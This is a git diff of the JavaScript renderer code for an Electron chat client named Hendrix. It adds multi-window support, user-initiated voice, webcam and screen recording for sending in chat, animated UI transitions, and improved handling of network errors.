@@ -10,7 +10,8 @@ const {
 } = electron;
 
 const {
-    dialog
+    dialog,
+    BrowserWindow
 } = remote;
 
 const {
@@ -20,7 +21,6 @@ const {
 webFrame.setZoomFactor(1);
 webFrame.setVisualZoomLevelLimits(1, 1);
 webFrame.setLayoutZoomLevelLimits(0, 0);
-//currentWindow.flashFrame(true); //подсветка иконки приложения (можно использовать для уводмлений)
 
 const aes = require(`aes-js`);
 const RSA = require(`node-rsa`);
@@ -136,7 +136,7 @@ fs.writeFile = util.promisify(fs.writeFile);
 fs.rmdir = util.promisify(fs.rmdir);
 fs.unlink = util.promisify(fs.unlink);
 
-let hendrixdir = path.join(os.homedir(), `Hendrix`);
+let hendrixdir = localStorage.getItem(`hendrixdir`) || path.join(os.homedir(), `Hendrix`);
 
 fs.readdir(hendrixdir, (err, data) => {
     if (err) {
@@ -162,7 +162,7 @@ let workerWindow;
 const childWindows = currentWindow.getChildWindows();
 
 if (!childWindows.length) {
-    workerWindow = new remote.BrowserWindow({
+    workerWindow = new BrowserWindow({
         show: false,
         webPreferences: {
             devTools: true,
@@ -174,6 +174,41 @@ if (!childWindows.length) {
 } else {
     workerWindow = childWindows[0];
 }
+
+const childs = [];
+
+getElem(`killAllPersons`).addEventListener(`click`, () => {
+    ipcRenderer.send(`killAllPerons`);
+});
+
+getElem(`createNewPerson`).addEventListener(`click`, () => {
+    const width = 800;
+    const height = 600;
+    const child = new BrowserWindow({
+        width,
+        height,
+        minWidth: width,
+        minHeight: height,
+        frame: false,
+        show: false,
+        icon: path.join(__dirname, `logo.png`),
+        backgroundColor: `#17212b`,
+        webPreferences: {
+            zoomFactor: 1,
+            devTools: false,
+            textAreasAreResizable: false,
+            nodeIntegration: true,
+        }
+    });
+    childs.push(child);
+    child.loadFile('index.html');
+    child.once(`ready-to-show`, () => {
+        child.show();
+    });
+    child.on('closed', function () {
+        childs.splice(childs.indexOf(child), 1);
+    });
+});
 
 global.copyText = text => clipboard.writeText(text);
 global.openLink = link => shell.openExternal(link);
@@ -242,29 +277,42 @@ const elements = {
     money: getElem(`money`),
     moneyAccount: getElem(`moneyAccount`),
     oneToOneMessageSound: getElem(`oneToOneMessageSound`),
-    add1: getElem(`add1`)
-    //повесить на roomFilter листенер keydown. Когда Enter - отправлять запрос на сервер по фильтрации комнат
+    add1: getElem(`add1`),
+    showRoomsList: getElem(`showRoomsList`),
+    audioRec: getElem(`audioRec`),
+    webcamRec: getElem(`webcamRec`),
+    screenRec: getElem(`screenRec`),
+    saveFilesNames: getElem(`saveFilesNames`)
 };
+
+ipcRenderer.send(`openWindow`);
+
+ipcRenderer.on(`openWindowNum`, async (event, arg) => {
+    document.querySelector("body > div.title-bar > div.app-name-container").textContent = `HENDRIX ${arg}`;
+    const title = `Hendrix ${arg}`;
+    currentWindow.setTitle(title);
+    setInterval(async () => {
+        const windows = await desktopCapturer.getSources({
+            types: [`window`],
+            thumbnailSize: {
+                width: 64,
+                height: 64
+            }
+        });
+        const curWindow = windows.find(e => e.name == title);
+        if (!curWindow) {
+            return;
+        }
+        ipcRenderer.send(`windowScreen`, {
+            id: currentWindow.id,
+            data: curWindow.thumbnail.toPNG()
+        });
+    }, 5000);
+});
 
 elements.notifications.addEventListener(`change`, function () {
     user.showNotifications = this.checked;
-    if (!this.checked) {
-        ipcRenderer.send(`disableNotifications`);
-    }
 });
-
-setInterval(() => {
-    //user.isForegroundWindow
-    //false - окно не на переднем плане
-    //true - окно на переднем плане
-    if (currentWindow.isMinimized()) {
-        user.isForegroundWindow = false;
-    } else if (!currentWindow.isVisible()) {
-        user.isForegroundWindow = false;
-    } else {
-        user.isForegroundWindow = true;
-    }
-}, 500);
 
 let dotsCount = 0;
 
@@ -274,7 +322,9 @@ const nowTypingList = {};
 
 const typingTimers = {};
 
-const server = `http://92.63.98.195:8080`;
+const {
+    server
+} = require(`./config`);
 
 const sleep = time => new Promise(res => {
     setTimeout(() => {
@@ -319,38 +369,42 @@ const decryptAES = (text, key) => {
     return Buffer.from(decryptedBytes).toString();
 };
 
-const encryptObjAES = (obj, key) => (Object.keys(obj).forEach(property => {
-    obj[property] = encryptAES(obj[property], key);
-}), obj);
-
-const decryptObjAES = (obj, key) => (Object.keys(obj).forEach(property => {
-    obj[property] = decryptAES(obj[property], key);
-}), obj);
-
 const getRandomId = async (bytes = 32) => (await crypto.randomBytes(bytes)).toString(`hex`);
 
 const testKey = hashPassword(`test`);
 const testEncrypt = (text, key) => decryptAES(encryptAES(text, key), key) == text;
 
+let waitReconnectTimer;
+
 const requestPostAsync = params => new Promise((resolve, reject) => {
-    request.post(params, (err, httpResponse, body) => {
-        if (err) {
-            reject(err);
-            console.log(body, err);
+    request.post(params, async (err, httpResponse, body) => {
+        if (err && !waitReconnectTimer) {
+            waitReconnectTimer = true;
             if (err.message.match(/(connect ECONNREFUSED)|(socket hang up)/i)) {
-                dialog.showMessageBox(currentWindow, {
+                const {response} = (await dialog.showMessageBox(currentWindow, {
                     type: `error`,
-                    title: `Критическая ошибка!`,
+                    title: `Что-то пошло не так...`,
                     message: `Сервер недоступен или вы не подключены к сети.`,
-                });
-                remote.app.quit();
+                    buttons: [`Выйти из Hendrix`, `Перезапустить Hendrix`, `Подождать`],
+                }));
+                switch(response) {
+                    case 1:
+                        remote.app.relaunch();
+                    case 0:
+                        remote.app.quit();
+                        break;
+                    default:
+                        waitReconnectTimer = setTimeout(() => {
+                            waitReconnectTimer = false;
+                        }, 60000);
+                }
             }
+            return resolve(false);
         }
         let json;
         try {
             json = JSON.parse(body);
         } catch (e) {
-            showErrorModal(`Ошибка потери пакета!`);
             return resolve(false);
         }
         resolve(json);
@@ -370,7 +424,7 @@ const getFirstKeys = async () => {
     user.aesKey = key.decrypt(Buffer.from(getAESKey.aeskeyencrypted, `hex`).toString(`base64`), `utf8`);
     user.aesKeyBytes = Buffer.from(user.aesKey, `hex`);
     user.secretString = await getRandomId();
-    await requestPostAsync({
+    const {userId} = await requestPostAsync({
         url: `${server}/savePerson`,
         form: {
             pos: getAESKey.pos,
@@ -379,15 +433,18 @@ const getFirstKeys = async () => {
                 color: user.color,
                 secretString: user.secretString,
                 _token: user._token
-            }, user.aesKeyBytes),
-            _id: user._id
+            }, user.aesKeyBytes)
         }
     });
+    user._id = userId;
     user.active = true;
 };
 
 const updateKeys = async () => {
-    swal(`Обновляем сеансовые ключи. Пожалуйста, подождите...`);
+    swal({
+        text: `Обновляем сеансовые ключи. Пожалуйста, подождите...`,
+        buttons: false
+    }, true);
     await sleep(300);
     const key = new RSA({
         b: +elements.RSAKeySize.value
@@ -404,26 +461,31 @@ const updateKeys = async () => {
     });
     user.aesKey = key.decrypt(Buffer.from(updateAESKey.aeskeyencrypted, `hex`).toString(`base64`), `utf8`);
     user.aesKeyBytes = Buffer.from(user.aesKey, `hex`);
-    document.getElementsByClassName(`swal-button swal-button--confirm`)[0].click();
-    swal(`Обновление ключей завершено. Вы настоящий параноик!`);
-    return true;
+    swal({
+        text: `Обновление ключей завершено. Вы настоящий параноик!`,
+        buttons: false
+    }, true);
 };
 
 elements.changeAESkey.addEventListener(`click`, async () => {
-    if (user.room) {
+    const {room} = user;
+    if (room) {
         await user.disconnect();
     }
-    updateKeys();
+    await updateKeys();
+    if (room) {
+        connectToTheRoom(room.password, room._id, room.color, room.name);
+    }
 });
 
-const showErrorModal = text => swal({
+const showErrorModal = async text => await swal({
     title: `У-упс!`,
     text,
     icon: `error`,
     button: `Ой`
 });
 
-const showErrorDialog = message => dialog.showMessageBox(currentWindow, {
+const showErrorDialog = async message => await dialog.showMessageBox(currentWindow, {
     type: `error`,
     title: `Ошибка!`,
     message
@@ -446,6 +508,9 @@ const showUsersInRoom = async () => {
                 _id: user._id
             }
         })).members;
+        if (!members) {
+            return;
+        }
         let r = ``;
         members = JSON.parse(decryptAES(members, user.aesKeyBytes));
         members.forEach(member => {
@@ -473,6 +538,8 @@ const connectToTheRoom = async (password, _id, color, name) => {
     const room = {
         password,
         _id,
+        color,
+        name
     };
     user.room = room;
     const logIn = (await requestPostAsync({
@@ -485,6 +552,14 @@ const connectToTheRoom = async (password, _id, color, name) => {
     if (logIn) {
         user.subscribe();
     }
+    getElem(`message`).style.display = `flex`;
+        animate({
+            timing: makeEaseOut(circAnimateFunc),
+            draw(progress) {
+                elements.chat.style.gridTemplateRows = `minmax(18px, 3vh) ${100 - 20 * progress}vh 3vh 11vh 5vh`;
+            },
+            duration: 200
+        });
     elements.titleText.innerHTML = `<span class="header" data-title='Нажмите для отображения участников комнаты' style="color: ${color}">${name}</span>`;
     document.getElementsByClassName(`header`)[0].addEventListener(`click`, () => {
         showUsersInRoom();
@@ -507,12 +582,16 @@ const checkPasswordRoom = async (password, _id) => {
 };
 
 const showRooms = async () => {
-    rooms = JSON.parse(decryptAES((await requestPostAsync({
+    const answer = (await requestPostAsync({
         url: `${server}/getPublicRooms`,
         form: {
             _id: user._id
         }
-    })).data, user.aesKeyBytes));
+    })).data;
+    if (!answer) {
+        return;
+    }
+    rooms = JSON.parse(decryptAES(answer, user.aesKeyBytes));
     let r = ``;
     for (let roomId in rooms) {
         const room = rooms[roomId];
@@ -556,6 +635,8 @@ const showRooms = async () => {
                         } else {
                             if (auth.banned) {
                                 showErrorModal(`Вы забанены в этой комнате!`);
+                            } else if (auth.multi) {
+                                showErrorModal(`Вы уже есть в этой комнате в одном из окон!`);
                             } else {
                                 showErrorModal(`Комнаты не существует!`);
                             }
@@ -585,6 +666,8 @@ const showRooms = async () => {
                         } else {
                             if (r.banned) {
                                 showErrorModal(`Вы забанены в этой комнате!`);
+                            } else if (auth.multi) {
+                                showErrorModal(`Вы уже есть в этой комнате в одном из окон!`);
                             } else {
                                 showErrorModal(`Неправильный пароль!`);
                             }
@@ -598,7 +681,6 @@ const showRooms = async () => {
 };
 
 let user = {}; //объект пользователя
-let toggle = false;
 let rooms;
 
 elements.connectToTheHiddenRoom.addEventListener(`click`, () => {
@@ -655,14 +737,15 @@ document.addEventListener(`mousedown`, e => {
 //     }
 // });
 
-getElem(`updateFolder`).addEventListener(`click`, () => {
-    const newFolder = dialog.showOpenDialog(currentWindow, {
+getElem(`updateFolder`).addEventListener(`click`, async () => {
+    const [newFolder] = (await dialog.showOpenDialog(currentWindow, {
         defaultPath: hendrixdir,
         properties: [`openDirectory`]
-    });
+    })).filePaths;
     if (newFolder) {
-        hendrixdir = newFolder[0];
+        hendrixdir = newFolder;
         getElem(`downloads`).value = hendrixdir;
+        localStorage.setItem(`hendrixdir`, hendrixdir);
     }
 });
 
@@ -705,10 +788,41 @@ const playSound = src => new Promise(resolve => {
     sound.addEventListener(`ended`, resolve);
 });
 
+const playSoundSpecial = (src, volume = 1) =>
+new Promise(resolve => {
+  const sound = new Audio(src);
+  sound.volume = volume;
+  sound.play();
+  let now = performance.now();
+  let soundTimer = setInterval(() => {
+        if (performance.now() - now >= sound.duration * 1000 - 60) { //local 45 inet 75  75 30
+            clearInterval(soundTimer);
+            resolve(`ended`);
+        }
+    });
+});
+
+const clearDataFlag = document.createElement(`input`);
+clearDataFlag.setAttribute(`type`, `checkbox`);
+const closeWindowButton = document.createElement(`button`);
+closeWindowButton.textContent = `Закрыть это окно`;
+
+closeWindowButton.addEventListener(`click`, () => {
+    currentWindow.close();
+});
+
 getElem(`exit-button`).addEventListener(`click`, () => {
+    const div = document.createElement(`div`);
+    div.textContent = `Вы уверены, что хотите выйти из Hendrix?`;
+    const delDataDiv = document.createElement(`div`);
+    delDataDiv.className = `des`;
+    delDataDiv.textContent = `Стереть локальные данные`;
+    delDataDiv.appendChild(clearDataFlag);
+    div.appendChild(delDataDiv);
+    div.appendChild(closeWindowButton);
     swal({
         title: `Выход`,
-        text: "Вы уверены, что хотите выйти?",
+        content: div,
         buttons: ["Отмена", "Да"],
         icon: "warning",
     }).then(async answer => {
@@ -716,7 +830,9 @@ getElem(`exit-button`).addEventListener(`click`, () => {
             if (user.room) {
                 await user.disconnect();
             }
-            localStorage.clear();
+            if (clearDataFlag.checked) {
+                localStorage.clear();
+            }
             remote.app.quit();
         }
     });
@@ -754,41 +870,116 @@ elements.servers.addEventListener(`mouseout`, () => {
 
 elements.clear.addEventListener(`click`, () => {
     elements.dialog.innerHTML = ``;
+    elements.dialog.dispatchEvent(new CustomEvent(`scroll`));
     user._dump = [];
     user._history = [];
     user._historyPos = -1;
-    elements.scrolldown.style.display = `none`;
     playSound(`sounds/clear.mp3`);
 });
 
-elements.scrolldown.addEventListener(`click`, () => {
-    elements.dialog.scrollTo(0, elements.dialog.scrollHeight);
-    elements.scrolldown.style.display = `none`;
+let scrollCondPast;
+
+elements.dialog.addEventListener(`scroll`, function (e) {
+    const scrollCond = this.scrollHeight - (this.scrollTop + this.clientHeight) > 400;
+    if (scrollCond ^ scrollCondPast) { //если не равны, то есть условие переключилось, меняем состояние
+        if (scrollCond) {
+            animate({
+                timing: makeEaseOut(circAnimateFunc),
+                draw(progress) {
+                    elements.scrolldown.style.bottom = `${10 + progress * 6.5}vh`;
+                    elements.scrolldown.style.transform = `rotate(${(1 - progress) * 180}deg)`;
+                },
+                duration: 200
+            });
+            elements.scrolldown.addEventListener(`click`, () => {
+                const curPos = elements.dialog.scrollTop;
+                elements.dialog.scrollTo(0, elements.dialog.scrollHeight);
+                const maxScrollHeight = elements.dialog.scrollTop;
+                elements.dialog.scrollTo(0, curPos);
+                animate({
+                    timing: makeEaseOut(circAnimateFunc),
+                    draw(progress) {
+                        if (!progress) {
+                            progress = 0;
+                        }
+                        elements.dialog.scrollTo(0, curPos + (maxScrollHeight - curPos) * progress);
+                    },
+                    duration: 1000,
+                    endAnimation() {
+                        nowScrollDown = false;
+                    }
+                });
+            }, {
+                once: true
+            });
+        } else {
+            animate({
+                timing: circAnimateFunc,
+                draw(progress) {
+                    elements.scrolldown.style.bottom = `${16.5 - progress * 6.5}vh`;
+                    elements.scrolldown.style.transform = `rotate(${-progress * 180}deg)`;
+                },
+                duration: 200
+            });
+        }
+    }
+    scrollCondPast = scrollCond;
 });
 
-elements.dialog.addEventListener(`scroll`, function () {
-    if (this.scrollHeight - (this.scrollTop + this.clientHeight) > 400) {
-        elements.scrolldown.style.display = `block`;
-    } else {
-        elements.scrolldown.style.display = `none`;
-    }
-});
+let animationStep = 0.75;
+
+const animate = ({
+    timing,
+    draw,
+    duration,
+    endAnimation = () => {}
+} = {}) => {
+    const start = performance.now();
+    let requestId = requestAnimationFrame(function animate(time) {
+        let timeFraction = (time - start) / duration;
+        if (timeFraction > 1) timeFraction = 1;
+        let progress = timing(timeFraction);
+        draw(progress);
+        if (timeFraction < 1) {
+            requestId = requestAnimationFrame(animate);
+        } else {
+            endAnimation();
+        }
+    });
+    return () => cancelAnimationFrame(requestId);
+}
+
+const makeEaseOut = timing => timeFraction => 1 - timing(1 - timeFraction);
+
+const circAnimateFunc = timeFraction => 1 - Math.sin(Math.acos(timeFraction));
 
 getElem(`opncls`).addEventListener(`click`, function () {
-    const pos = +(toggle = !toggle);
-    elements.chat.style.gridTemplateColumns = [`25vw 75vw`, `5vw 95vw`][pos];
-    elements.add1.style.backgroundColor = elements.roomFilter.style.backgroundColor = elements.servers.style.backgroundColor = [`#0e1621`, `#17212b`][pos];
-    //если прога станет более менее популярной, фича фильтрации комнат будет возвращена к разработке
-    //elements.roomFilter.style.display = getElem(`rooms`).style.display = [`inline-block`, `none`][pos];
-    elements.rooms.style.display = [`inline-block`, `none`][pos];
-    this.style.height =
-        this.style.width =
-        getElem(`showRoomModal`).style.height =
-        getElem(`showRoomModal`).style.width =
-        getElem(`connectToTheHiddenRoom`).style.height =
-        getElem(`connectToTheHiddenRoom`).style.width = [`32px`, `24px`][pos];
-    getElem(`connectToTheHiddenRoom`).style.minHeight =
-        getElem(`connectToTheHiddenRoom`).style.minWidth = [`32px`, `24px`][pos];
+    elements.serverMenu.style.display = elements.rooms.style.display = `none`;
+    animate({
+        timing: circAnimateFunc,
+        draw(progress) {
+            elements.chat.style.gridTemplateColumns = `${25 * (1 - progress)}vw ${75 + 25 * progress}vw`;
+        },
+        duration: 200,
+        endAnimation() {
+            elements.showRoomsList.style.display = `block`;
+        }
+    });
+});
+
+elements.showRoomsList.addEventListener(`click`, function () {
+    this.style.display = `none`;
+    animate({
+        timing: makeEaseOut(circAnimateFunc),
+        draw(progress) {
+            elements.chat.style.gridTemplateColumns = `${25 * progress}vw ${100 - 25 * progress}vw`;
+        },
+        duration: 200,
+        endAnimation() {
+            elements.rooms.style.display = `inline-block`;
+            elements.serverMenu.style.display = `flex`;
+        }
+    });
 });
 
 getElem(`close-button`).addEventListener(`click`, () => {
@@ -851,13 +1042,19 @@ elements.inputMessage.addEventListener(`focus`, function () {
     }
 });
 
-const send = (function () {
+const send = (async function () {
+    if (!user.audio) {
+        lastL = 0;
+        changeIcon(`audio`);
+    }
     const message = this.innerText;
     const match = message.match(/\s+/);
     if (!message.length || match && match[0].length == message.length) {
-        return showErrorModal(`Слишком пусто :C, мы не можем это отправить`);
-    } else if (message.length > 4096) {
-        return showErrorModal(`Ваша щедрость губительна для нас! Давайте полехче`);
+        await showErrorModal(`Слишком пусто :C, мы не можем это отправить`);
+        return elements.inputMessage.focus();
+    } else if (message.length > 262144) {
+        await showErrorModal(`Ваша щедрость губительна для нас! Давайте полехче`);
+        return elements.inputMessage.focus();
     }
     delete user.lastPress;
     user.publish({
@@ -871,7 +1068,7 @@ const send = (function () {
     if (user._historyPos) {
         user._historyPos -= 1;
     }
-    if (user._history.length > 20) {
+    if (user._history.length > 50) {
         user._history.pop();
     }
     this.textContent = ``;
@@ -882,7 +1079,6 @@ const dontRemind = getElem(`dontRemind`);
 
 const exitRoom = async () => {
     await user.disconnect();
-    swal(`Вы успешно вышли из комнаты!`);
     elements.inputMessage.blur();
 };
 
@@ -906,45 +1102,188 @@ getElem(`disconnect`).addEventListener(`click`, () => {
     });
 });
 
+const getMediaCallback = (type, ext, title, style) => {
+    return async e => {
+        const blob = e.data;
+        const buf = await blobToBuffer(blob);
+        const url = URL.createObjectURL(blob);
+        const div = document.createElement(`div`);
+        div.innerHTML = `<${type} src="${url}" controls ${style ? `style="${style}"` : ``}></${type}>`;
+        const saveButton = document.createElement(`button`);
+        saveButton.textContent = `Сохранить файл`;
+        div.appendChild(saveButton);
+        saveButton.addEventListener(`click`, async () => {
+            const {filePath} = await dialog.showSaveDialog({
+                defaultPath: await getRandomId(),
+                filters: [{
+                    name: '',
+                    extensions: [ext.slice(1)]
+                }]
+            });
+            if (filePath) {
+                fs.writeFile(filePath, buf);
+            }
+        });
+        swal({
+            title,
+            content: div,
+            buttons: ["Отмена", "Отправить"],
+        }).then(async answer => {
+            elements.inputMessage.focus();
+            if (answer) {
+                filesSendCallbacksStack.push(async () => {
+                    await sendBuffer(await zlib.deflate(buf), ext);
+                });
+            }
+        });
+    };
+};
+
+const startAudio = async () => {
+    user.audio = true;
+    recorder = await getAudioRec();
+    if (!recorder) {
+        user.audio = false;
+        return showErrorModal(`Доступ к микрофону заблокирован!`);
+    }
+    elements.audioRec.style.backgroundImage = `url(styles/audio_red.png)`;
+    changeIcon(`send`);
+    recorder.start();
+    recorder.ondataavailable = getMediaCallback(`audio`, `.mp3`, `Отправка голосового сообщения`);
+};
+
+elements.audioRec.addEventListener(`click`, () => {
+    if (user.audio) {
+        stopAudio();
+    } else {
+        startAudio();
+    }
+});
+
+const getVideoRecorder = async (opt, videoSourceFlag) => {
+    try {
+        const videoSource = await navigator.mediaDevices.getUserMedia(opt);
+        const recorder = new MediaRecorder(videoSource, {
+            mimeType: `video/webm;codecs=h264,vp9,opus`
+        });
+        if (videoSourceFlag) {
+            return {
+                recorder,
+                videoSource
+            }
+        }
+        return recorder;
+    } catch (e) {
+        return {
+            error: true,
+            e
+        };
+    }
+};
+
+const startScreenVideo = async () => {
+    user.screenRecorder = true;
+    const source = (await desktopCapturer.getSources({
+        types: ['screen']
+    })).find(source => source.name == 'Entire screen' || source.name == `Screen 1`);
+    const {size} = screen.getPrimaryDisplay();
+    const recorder = await getVideoRecorder({
+        audio: {
+            mandatory: {
+                chromeMediaSource: 'desktop'
+            }
+        },
+        video: {
+            mandatory: {
+                chromeMediaSource: 'desktop',
+                chromeMediaSourceId: source.id,
+                minWidth: size.width,
+                maxWidth: size.width,
+                minHeight: size.height,
+                maxHeight: size.height
+            }
+        }
+    });
+    if (recorder.e) {
+        delete user.screenRecorder;
+        return showErrorModal(`Ошибка: ${recorder.e}`);;
+    }
+    user.screenRecorder = recorder;
+    elements.screenRec.style.backgroundImage = `url(styles/screen_red.png)`;
+    recorder.start();
+    recorder.ondataavailable = getMediaCallback(`video`, `.webm`, `Отправка видео`, `width: 350px`);
+};
+
+const stopScreenVideo = () => {
+    user.screenRecorder.stop();
+    user.screenRecorder.stream.getTracks().map(track => track.stop());
+    delete user.screenRecorder;
+    elements.screenRec.style.backgroundImage = `url(styles/screen.png)`;
+};
+
+elements.screenRec.addEventListener(`click`, () => {
+    if (user.screenRecorder) {
+        stopScreenVideo();
+    } else {
+        startScreenVideo();
+    }
+});
+
+const startWebcamVideo = async () => {
+    user.webcamRecorder = true;
+    const {recorder, videoSource} = await getVideoRecorder({
+        video: true,
+        audio: true
+    }, true);
+    if (recorder.e) {
+        delete user.webcamRecorder;
+        return showErrorModal(`Ошибка: ${recorder.e}`);;
+    }
+    const videoEl = document.createElement(`video`);
+    videoEl.srcObject = videoSource;
+    videoEl.autoplay = true;
+    videoEl.style.width = `350px`;
+    swal({
+        title: `Запись видео с веб-камеры`,
+        content: videoEl,
+        buttons: false,
+    });
+    user.webcamRecorder = recorder;
+    elements.webcamRec.style.backgroundImage = `url(styles/webcam_red.png)`;
+    recorder.start();
+    recorder.ondataavailable = getMediaCallback(`video`, `.webm`, `Отправка видео`, `width: 350px`);
+};
+
+const stopWebcamVideo = () => {
+    user.webcamRecorder.stop();
+    user.webcamRecorder.stream.getTracks().map(track => track.stop());
+    delete user.webcamRecorder;
+    elements.webcamRec.style.backgroundImage = `url(styles/webcam.png)`;
+};
+
+elements.webcamRec.addEventListener(`click`, () => {
+    if (user.webcamRecorder) {
+        stopWebcamVideo();
+    } else {
+        startWebcamVideo();
+    }
+});
+
+const stopAudio = () => {
+    changeIcon();
+    delete user.audio;
+    recorder.stop();
+    recorder.stream.getTracks().map(track => track.stop());
+    elements.audioRec.style.backgroundImage = `url(styles/audio.png)`;
+};
+
 elements.send.addEventListener(`click`, async () => {
     if (user.room && user.audio) {
-        changeIcon();
-        delete user.audio;
-        recorder.stop();
-        return recorder.stream.getTracks().map(track => track.stop());
+        return stopAudio();
     }
     if (user.room) {
         if (!elements.inputMessage.textContent.length && !user.audio) {
-            recorder = await getAudioRec();
-            if (!recorder) {
-                return showErrorModal(`Доступ к микрофону заблокирован!`);
-            }
-            swal({
-                text: `Запись голоса началась!`,
-                buttons: false
-            });
-            changeIcon(`send`);
-            recorder.start();
-            recorder.ondataavailable = async e => {
-                const blob = e.data;
-                const url = URL.createObjectURL(blob);
-                const div = document.createElement(`div`);
-                div.innerHTML = `<audio src="${url}" controls>`;
-                swal({
-                    title: `Отправка голосового сообщения`,
-                    content: div,
-                    buttons: ["Отмена", "Отправить"],
-                }).then(async answer => {
-                    if (answer) {
-                        const buf = await blobToBuffer(blob);
-                        filesSendCallbacksStack.push(async () => {
-                            await sendBuffer(await zlib.deflate(buf), `.mp3`);
-                        });
-                    }
-                });
-            };
-            user.audio = true;
-            return;
+            return startAudio();
         } else {
             changeIcon(`audio`);
         }
@@ -963,10 +1302,10 @@ getElem(`createDump`).addEventListener(`click`, async () => {
         return showErrorDialog(`Слишком короткий пароль`);
     }
     password = hashPassword(password);
-    const dumpPath = dialog.showOpenDialog(currentWindow, {
+    const [dumpPath] = (await dialog.showOpenDialog(currentWindow, {
         defaultPath: hendrixdir,
         properties: [`openDirectory`]
-    });
+    })).filePaths;
     if (dumpPath) {
         const data = Buffer.from(encryptAES((await zlib.deflate(JSON.stringify(user._dump))).toString(encoding), password), encoding);
         const curDate = new Date();
@@ -975,21 +1314,20 @@ getElem(`createDump`).addEventListener(`click`, async () => {
 });
 
 getElem(`loadDump`).addEventListener(`click`, async () => {
-    let file = dialog.showOpenDialog(currentWindow, {
+    let [file] = (await dialog.showOpenDialog(currentWindow, {
         defaultPath: hendrixdir,
         filters: [{
             name: 'Дамп переписки',
             extensions: ['hdmp']
         }],
         properties: [`openFile`]
-    });
+    })).filePaths;
     if (file) {
         let password = getElem(`dumpLoadPassword`).value;
         if (!password) {
             return showErrorDialog(`Слишком короткий пароль`);
         }
         password = hashPassword(password);
-        file = file[0];
         const data = await fs.readFile(file);
         try {
             const dump = JSON.parse(await zlib.unzip(Buffer.from(decryptAES(data, password), encoding)));
@@ -1065,6 +1403,11 @@ const changeHistoryPos = {
 };
 
 elements.inputMessage.addEventListener(`keydown`, function (e) {
+    if (!(e.ctrlKey && e.key.match(/[vм]/i))) {
+        const sel = getSelection();
+        curPastePos = sel.anchorOffset;
+        curAnchorNodeLength = sel.anchorNode.length || 0;
+    }
     if (e.ctrlKey && user._history.length && changeHistoryPos[e.key]) {
         user._historyPos += changeHistoryPos[e.key];
         user._historyPos = user._historyPos < 0 ? 0 : user._historyPos > user._history.length - 1 ? user._history.length - 1 : user._historyPos;
@@ -1073,16 +1416,12 @@ elements.inputMessage.addEventListener(`keydown`, function (e) {
     }
     if (e.key == `Enter` && !e.shiftKey) {
         e.preventDefault();
-        if (!user.audio) {
-            lastL = 0;
-            changeIcon(`audio`);
-        }
         send();
-    } else if (true) { //page up down disable here
-
+    } else if (e.key.match(/page((up)|(down))/i)) { //page up down disable here
+        e.preventDefault();
     }
 });
-
+let curPastePos, curAnchorNodeLength;
 elements.inputMessage.addEventListener(`paste`, function (e) {
     e.preventDefault();
     document.execCommand(`insertHTML`, false, e.clipboardData.getData(`text/plain`).replace(/\n/g, `<br>`));
@@ -1091,12 +1430,13 @@ elements.inputMessage.addEventListener(`paste`, function (e) {
             childNone.textContent = childNone.textContent.replace(/\n/g, '');
         }
     }
+    const sel = getSelection();
     const range = document.createRange();
-    const sel = window.getSelection();
     const {
         anchorNode
     } = sel;
-    range.setStart(this.childNodes[[...this.childNodes].indexOf(anchorNode)], anchorNode.textContent.length);
+    const newPos = Math.abs(curPastePos + anchorNode.length - curAnchorNodeLength);
+    range.setStart(this.childNodes[[...this.childNodes].indexOf(anchorNode)], newPos > anchorNode.length ? anchorNode.length : newPos);
     range.collapse(true);
     sel.removeAllRanges();
     sel.addRange(range);
@@ -1131,8 +1471,8 @@ const waitWriteStream = WriteStream => new Promise(res => {
     WriteStream.on(`finish`, () => res(true));
 });
 
-const getMessageBlock = (color, nameBlock, date, message) => `
-    <div class="messageBlock">
+const getMessageBlock = (color, nameBlock, date, message, backgroundClr) => `
+    <div class="messageBlock" ${backgroundClr ? `style="background-color: ${backgroundClr}"` : ``}>
         <div class="name" style="color:${color}">
             ${nameBlock}
         </div>
@@ -1329,7 +1669,6 @@ getElem(`next`).addEventListener(`click`, async function (e) {
             _historyPos: -1,
             files: {},
             showNotifications: true,
-            _id: await getRandomId(),
             _dump: [],
             async subNotifications(canceled) {
                 const obj = {
@@ -1345,6 +1684,9 @@ getElem(`next`).addEventListener(`click`, async function (e) {
                         _id: this._id
                     }
                 });
+                if (!notification) {
+                    return setImmediate(this.subNotifications);
+                }
                 notification = JSON.parse(decryptAES(notification.data, this.aesKeyBytes));
                 const div = document.createElement(`div`);
                 div.innerHTML = notification.message;
@@ -1417,6 +1759,7 @@ getElem(`next`).addEventListener(`click`, async function (e) {
                             SSort((a, b) => a - b, this.files[fileId].positions, this.files[fileId].parts);
                         } else {
                             const fileBlock = createMessageBlock(message.color, `${message.name}${additional}`, `${hours.padStart(2, `0`)}:${minutes.padStart(2, `0`)}:${seconds.padStart(2, `0`)}`);
+                            fileBlock.messageBlock.style.backgroundColor = message.user == this._id ? `#2b5278` : `inherit`;
                             elements.dialog.appendChild(fileBlock.messageBlock);
                             addMessageSound(message, this);
                             this.files[fileId] = {
@@ -1440,11 +1783,10 @@ getElem(`next`).addEventListener(`click`, async function (e) {
                                 showErrorModal(`Файл ${this.files[fileId].path} повреждён!`);
                             }
                         }
-                        await sleep(250);
-                        if (this.showNotifications && !this.isForegroundWindow) {
+                        const focusedWindow = BrowserWindow.getFocusedWindow();
+                        if (this.showNotifications && !focusedWindow || focusedWindow.id != currentWindow.id) {
                             let note = {
                                 name: message.name,
-                                text: `file${ext}`,
                                 color: message.color
                             };
                             if (ext.match(/(png)|(jpg)|(gif)|(jpeg)/i)) {
@@ -1469,6 +1811,7 @@ getElem(`next`).addEventListener(`click`, async function (e) {
                     } else {
                         if (!this.files[fileId]) {
                             const fileBlock = createMessageBlock(message.color, `<span onclick="copyText('${message.user}')" class="user">${message.name}</span>${additional}`, `${hours.padStart(2, `0`)}:${minutes.padStart(2, `0`)}:${seconds.padStart(2, `0`)}`);
+                            fileBlock.messageBlock.style.backgroundColor = message.user == this._id ? `#2b5278` : `inherit`;
                             elements.dialog.appendChild(fileBlock.messageBlock);
                             addMessageSound(message, this);
                             scroll();
@@ -1514,8 +1857,9 @@ getElem(`next`).addEventListener(`click`, async function (e) {
                     } else {
                         nameBlock = message.name;
                     }
-                    elements.dialog.insertAdjacentHTML(`beforeEnd`, getMessageBlock(message.color, `${nameBlock}${additional}`, `${hours.padStart(2, `0`)}:${minutes.padStart(2, `0`)}:${seconds.padStart(2, `0`)}`, text));
-                    if (message.name && message.message && message.color && this.showNotifications && !this.isForegroundWindow) {
